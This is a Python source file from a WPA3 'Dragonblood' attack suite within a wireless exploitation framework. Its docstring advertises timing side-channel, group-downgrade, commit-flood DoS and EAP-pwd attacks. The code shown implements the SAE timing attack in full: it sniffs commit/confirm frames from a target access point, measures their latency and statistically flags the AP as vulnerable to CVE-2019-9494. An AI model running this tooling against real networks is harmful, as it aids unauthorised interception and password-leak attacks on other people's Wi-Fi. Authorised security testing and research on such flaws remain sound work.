#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek - https://github.com/Uniao-Geek
"""Dragonblood WPA3-SAE Attack Suite - native Python implementation.

Implements all Dragonblood attack primitives (Vanhoef/Ronen, 2019) as native
Python classes using Scapy, eliminating dependency on external binaries:

  - DragonTimingAttack : SAE timing side-channel (CVE-2019-9494)
  - DragonForce        : SAE group downgrade probe to WPA2-PSK
  - DragonDrain        : SAE commit flood DoS (CVE-2019-9495)
  - DragonSlayer       : EAP-pwd timing side-channel (CVE-2019-9499)

Also provides a WPA3 transition-mode downgrade attack reference workflow.

CVEs: CVE-2019-9494 through CVE-2019-9499, CVE-2019-13377, CVE-2019-13456.

Requires: Scapy, Python 3.8+, Linux monitor-mode interface.

Version: 2.0.0
"""


import json
import logging
import math
import os
import random
import threading
import time
from typing import Any, Dict, List, Optional, Tuple

from wirelessxpl.core.exploit import *
from wirelessxpl.core.os_guard import OSRequirement, requires_os
from wirelessxpl.modules.generic.wifi._disclaimer import require_authorised_lab

logger = logging.getLogger(__name__)

HAS_SCAPY = False
try:
    from scapy.all import (  # type: ignore[import]
        Dot11,
        Dot11Auth,
        RadioTap,
        sendp,
    )
    from scapy.all import (
        conf as scapy_conf,
    )
    from scapy.all import (
        sniff as scapy_sniff,
    )
    HAS_SCAPY = True
except ImportError:
    pass

HAS_NUMPY = False
try:
    import numpy as np  # type: ignore[import]
    HAS_NUMPY = True
except ImportError:
    pass

_project_tmp = os.path.join(
    os.path.dirname(__file__), "..", "..", "..", ".tmp"
)
os.makedirs(_project_tmp, exist_ok=True)

# 802.11 SAE constants
_SAE_ALGORITHM = 3
_SAE_COMMIT_SEQ = 1
_SAE_CONFIRM_SEQ = 2
_DOT11_MGMT_TYPE = 0
_DOT11_AUTH_SUBTYPE = 11

# EAP frame constants
_EAP_CODE_REQUEST = 1
_EAP_CODE_RESPONSE = 2
_EAP_TYPE_PWD = 52

# SAE groups per Dragonblood research - MODP groups have timing leaks
_MODP_VULNERABLE_GROUPS = (22, 23, 24)
_DRAGONFORCE_DEFAULT_GROUPS = [22, 23, 24, 126, 127, 128]


def _random_mac() -> str:
    """Generate a random locally-administered unicast MAC address.

    Returns:
        MAC address string in colon-separated lowercase hex notation.
    """
    octets = [random.randint(0, 255) for _ in range(6)]
    octets[0] = (octets[0] & 0xFE) | 0x02  # LA bit set, multicast cleared
    return ":".join(f"{b:02x}" for b in octets)


def _mean(values: list[float]) -> float:
    """Compute arithmetic mean without numpy.

    Args:
        values: List of numeric values.

    Returns:
        Arithmetic mean, or 0.0 for an empty list.
    """
    if not values:
        return 0.0
    return sum(values) / len(values)


def _stddev(values: list[float]) -> float:
    """Compute population standard deviation without numpy.

    Args:
        values: List of numeric values.

    Returns:
        Standard deviation, or 0.0 for fewer than two values.
    """
    if len(values) < 2:
        return 0.0
    avg = _mean(values)
    variance = sum((x - avg) ** 2 for x in values) / len(values)
    return math.sqrt(variance)


def _ttest_welch(a: list[float], b: list[float]) -> tuple[float, float]:
    """Welch's t-test for two independent samples (no scipy required).

    Args:
        a: First sample group.
        b: Second sample group.

    Returns:
        Tuple of (t_statistic, approximate_p_value). The p-value is a
        normal approximation; use scipy.stats.ttest_ind for exact results.
    """
    if len(a) < 2 or len(b) < 2:
        return (0.0, 1.0)
    mean_a, mean_b = _mean(a), _mean(b)
    var_a = sum((x - mean_a) ** 2 for x in a) / (len(a) - 1)
    var_b = sum((x - mean_b) ** 2 for x in b) / (len(b) - 1)
    se = math.sqrt(var_a / len(a) + var_b / len(b))
    if se == 0.0:
        return (0.0, 1.0)
    t_stat = (mean_a - mean_b) / se
    p_approx = 2.0 * (
        1.0 - 0.5 * (1.0 + math.erf(abs(t_stat) / math.sqrt(2.0)))
    )
    return (t_stat, p_approx)


# ---------------------------------------------------------------------------
# Native attack classes
# ---------------------------------------------------------------------------


class DragonTimingAttack:
    """SAE timing side-channel attack (CVE-2019-9494).

    Measures timing between SAE commit and confirm frames to detect
    group-dependent processing delays that leak password partition bits.
    Vulnerable APs process MODP groups 22/23/24 in measurably different
    times compared to ECC groups 19/20/21 (P-256/P-384/P-521).

    Args:
        interface: Monitor mode wireless interface.
        bssid: Target AP BSSID (empty string captures all BSSIDs).
        samples: Number of commit-confirm pairs to collect.
        dry_run: If True, simulate without live capture.
        output_dir: Directory to save timing data and report JSON files.
    """

    def __init__(
        self,
        interface: str,
        bssid: str,
        samples: int = 100,
        dry_run: bool = False,
        output_dir: str = "",
    ) -> None:
        self._interface = interface.strip()
        self._bssid = bssid.lower().strip()
        self._samples = max(samples, 1)
        self._dry_run = dry_run
        self._output_dir = output_dir.strip() or os.path.join(
            _project_tmp, "dragonblood_timing"
        )
        os.makedirs(self._output_dir, exist_ok=True)

    def _is_sae_frame(self, pkt: Any) -> bool:
        """Check if packet is an SAE Authentication frame.

        Args:
            pkt: Scapy packet to inspect.

        Returns:
            True if the packet is a SAE Authentication frame with seqnum
            1 (commit) or 2 (confirm).
        """
        if not pkt.haslayer(Dot11):
            return False
        dot11 = pkt.getlayer(Dot11)
        if dot11.type != _DOT11_MGMT_TYPE or dot11.subtype != _DOT11_AUTH_SUBTYPE:
            return False
        if not pkt.haslayer(Dot11Auth):
            return False
        auth = pkt.getlayer(Dot11Auth)
        return auth.algo == _SAE_ALGORITHM and auth.seqnum in (
            _SAE_COMMIT_SEQ,
            _SAE_CONFIRM_SEQ,
        )

    def _matches_bssid(self, pkt: Any) -> bool:
        """Check if frame involves the target BSSID.

        Args:
            pkt: Scapy packet to inspect.

        Returns:
            True if the frame addresses match self._bssid or no filter is set.
        """
        if not self._bssid:
            return True
        dot11 = pkt.getlayer(Dot11)
        addrs = [
            (getattr(dot11, "addr1", "") or "").lower(),
            (getattr(dot11, "addr2", "") or "").lower(),
            (getattr(dot11, "addr3", "") or "").lower(),
        ]
        return self._bssid in addrs

    def _extract_pairs(self, packets: list[Any]) -> list[dict[str, Any]]:
        """Extract commit-confirm timing pairs from a list of SAE frames.

        Groups frames by source MAC; for each source, pairs consecutive
        commit and confirm frames and records the time delta in milliseconds.

        Args:
            packets: List of Scapy packets to process.

        Returns:
            List of dicts with keys: src, commit_ts, confirm_ts, delta_ms.
        """
        pending: dict[str, tuple[float, Any]] = {}
        pairs: list[dict[str, Any]] = []

        for pkt in packets:
            if not self._is_sae_frame(pkt):
                continue
            if not self._matches_bssid(pkt):
                continue

            auth = pkt.getlayer(Dot11Auth)
            dot11 = pkt.getlayer(Dot11)
            src = (getattr(dot11, "addr2", "") or "").lower()
            ts = float(pkt.time) if hasattr(pkt, "time") else time.time()

            if auth.seqnum == _SAE_COMMIT_SEQ:
                pending[src] = (ts, pkt)
            elif auth.seqnum == _SAE_CONFIRM_SEQ:
                dst = (getattr(dot11, "addr1", "") or "").lower()
                key = dst if dst in pending else src
                if key in pending:
                    commit_ts, _ = pending.pop(key)
                    pairs.append(
                        {
                            "src": src,
                            "commit_ts": commit_ts,
                            "confirm_ts": ts,
                            "delta_ms": (ts - commit_ts) * 1000.0,
                        }
                    )

        return pairs

    def capture(self) -> list[dict[str, Any]]:
        """Capture live SAE Authentication frames and extract timing pairs.

        Returns:
            List of timing pair dicts. Empty list on dry_run or capture
            failure.
        """
        if not HAS_SCAPY:
            print_error("Scapy not available. Install: pip install scapy")
            return []

        if self._dry_run:
            print_info(
                f"[dry-run] DragonTimingAttack: would sniff {self._samples} "
                f"SAE pairs on {self._interface}"
                + (f" filtering BSSID {self._bssid}" if self._bssid else "")
            )
            return []

        print_status(
            f"Sniffing SAE frames on {self._interface}, "
            f"target: {self._samples} commit-confirm pairs"
            + (f", BSSID filter: {self._bssid}" if self._bssid else "")
        )
        print_info("Press Ctrl+C to stop early.")

        collected: list[Any] = []
        pair_count = 0

        def _packet_handler(pkt: Any) -> None:
            nonlocal pair_count
            if self._is_sae_frame(pkt) and self._matches_bssid(pkt):
                collected.append(pkt)
                auth = pkt.getlayer(Dot11Auth)
                if auth.seqnum == _SAE_CONFIRM_SEQ:
                    pair_count += 1
                    if pair_count % 10 == 0:
                        print_info(
                            f"  Captured {pair_count}/{self._samples} pairs"
                        )

        def _stop_filter(_pkt: Any) -> bool:
            return pair_count >= self._samples

        try:
            scapy_sniff(
                iface=self._interface,
                prn=_packet_handler,
                stop_filter=_stop_filter,
                store=False,
                timeout=self._samples * 10,
            )
        except KeyboardInterrupt:
            print_info("Capture interrupted.")
        except PermissionError:
            print_error("Permission denied. Run as root with CAP_NET_RAW.")
            return []

        pairs = self._extract_pairs(collected)
        print_info(f"Captured {len(pairs)} commit-confirm timing pairs.")

        ts_tag = int(time.time())
        raw_path = os.path.join(
            self._output_dir, f"dragontime_raw_{ts_tag}.json"
        )
        with open(raw_path, "w") as fh:
            json.dump(pairs, fh, indent=2, default=str)
        print_success(f"Raw timing data saved: {raw_path}")

        return pairs

    def analyze(self, pairs: list[dict[str, Any]]) -> dict[str, Any]:
        """Perform statistical timing analysis on captured SAE pairs.

        Checks for statistically significant differences in commit-confirm
        latency, which may indicate group-dependent processing consistent
        with CVE-2019-9494. Saves a JSON report to output_dir.

        Args:
            pairs: List of timing pairs produced by capture().

        Returns:
            Dict with keys: samples, mean_ms, stddev_ms, min_ms, max_ms,
            significant, p_value, verdict.
        """
        if not pairs:
            print_error("No timing data to analyze.")
            return {}

        deltas = [p["delta_ms"] for p in pairs]

        if HAS_NUMPY:
            avg = float(np.mean(deltas))
            std = float(np.std(deltas, ddof=1)) if len(deltas) > 1 else 0.0
        else:
            avg = _mean(deltas)
            std = _stddev(deltas)

        print_info("=" * 60)
        print_info("DragonTimingAttack - SAE Timing Analysis (CVE-2019-9494)")
        print_info("=" * 60)
        print_info(f"  Samples       : {len(deltas)}")
        print_info(f"  Mean delta    : {avg:.3f} ms")
        print_info(f"  Std deviation : {std:.3f} ms")
        print_info(f"  Min delta     : {min(deltas):.3f} ms")
        print_info(f"  Max delta     : {max(deltas):.3f} ms")

        by_src: dict[str, list[float]] = {}
        for p in pairs:
            by_src.setdefault(p.get("src", "unknown"), []).append(p["delta_ms"])

        result: dict[str, Any] = {
            "samples": len(deltas),
            "mean_ms": round(avg, 4),
            "stddev_ms": round(std, 4),
            "min_ms": round(min(deltas), 4),
            "max_ms": round(max(deltas), 4),
            "significant": False,
            "p_value": 1.0,
            "verdict": "inconclusive",
        }

        if len(by_src) >= 2:
            print_info("")
            print_info("Per-source timing breakdown:")
            for src, vals in sorted(by_src.items()):
                src_avg = float(np.mean(vals)) if HAS_NUMPY else _mean(vals)
                src_std = (
                    float(np.std(vals, ddof=1))
                    if HAS_NUMPY and len(vals) > 1
                    else _stddev(vals)
                )
                print_info(
                    f"  {src}: n={len(vals)}, "
                    f"mean={src_avg:.3f} ms, std={src_std:.3f} ms"
                )

            sorted_srcs = sorted(
                by_src.items(), key=lambda kv: len(kv[1]), reverse=True
            )
            grp_a_name, grp_a = sorted_srcs[0]
            grp_b_name, grp_b = sorted_srcs[1]
            if len(grp_a) >= 2 and len(grp_b) >= 2:
                t_stat, p_val = _ttest_welch(grp_a, grp_b)
                result["p_value"] = round(p_val, 6)
                print_info("")
                print_info(
                    f"Welch t-test ({grp_a_name} vs {grp_b_name}): "
                    f"t={t_stat:.4f}, p={p_val:.6f}"
                )
                if p_val < 0.05:
                    result["significant"] = True
                    result["verdict"] = "vulnerable"
                    print_success(
                        "Statistically significant timing difference (p < 0.05). "
                        "AP likely uses group-dependent SAE processing, "
                        "consistent with CVE-2019-9494 (MODP groups 22/23/24)."
                    )
                else:
                    result["verdict"] = "not_detected"
                    print_info(
                        "No significant timing difference (p >= 0.05). "
                        "Timing appears uniform across sources."
                    )
        else:
            print_info("")
            print_info(
                "Only one source MAC observed; cross-group comparison not "
                "possible. Capture from multiple clients or use different "
                "SAE groups to enable partition analysis."
            )

        ts_tag = int(time.time())
        report_path = os.path.join(
            self._output_dir, f"dragontime_report_{ts_tag}.json"
        )
        with open(report_path, "w") as fh:
            json.dump(result, fh, indent=2)
        print_success(f"Analysis report saved: {report_path}")

        return result

    def run(self) -> dict[str, Any]:
        """Execute full timing capture and analysis pipeline.

        Returns:
            Analysis result dict (see analyze()). Empty dict on failure.
        """
        pairs = self.capture()
        if pairs:
            return self.analyze(pairs)
        return {}


